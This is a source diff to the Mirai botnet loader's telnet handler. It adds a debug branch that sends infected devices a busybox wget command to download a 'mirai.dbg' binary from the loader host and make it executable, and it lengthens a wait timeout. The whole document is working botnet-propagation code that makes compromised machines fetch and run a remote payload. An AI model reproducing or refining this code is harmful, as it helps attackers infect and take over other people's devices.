@@ -449,8 +449,14 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                                 case UPLOAD_WGET:
                                     conn->state_telnet = TELNET_UPLOAD_WGET;
                                     conn->timeout = 120;
+#ifdef DEBUG
+				    util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
+                                                    wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", "dbg");
+#endif
+#ifndef DEBUG
                                     util_sockprintf(conn->fd, "/bin/busybox wget http://%s:%d/bins/%s.%s -O - > "FN_BINARY "; /bin/busybox chmod 777 " FN_BINARY "; " TOKEN_QUERY "\r\n",
                                                     wrker->srv->wget_host_ip, wrker->srv->wget_host_port, "mirai", conn->info.arch);
+#endif
 #ifdef DEBUG
                                     printf("wget\n");
 #endif
@@ -485,7 +491,7 @@ static void handle_event(struct server_worker *wrker, struct epoll_event *ev)
                         if (consumed)
                         {
                             conn->state_telnet = TELNET_RUN_BINARY;
-                            conn->timeout = 30;
+                            conn->timeout = 300;
 #ifdef DEBUG
                             printf("[FD%d] Finished wget loading\n", conn->fd);
 #endif
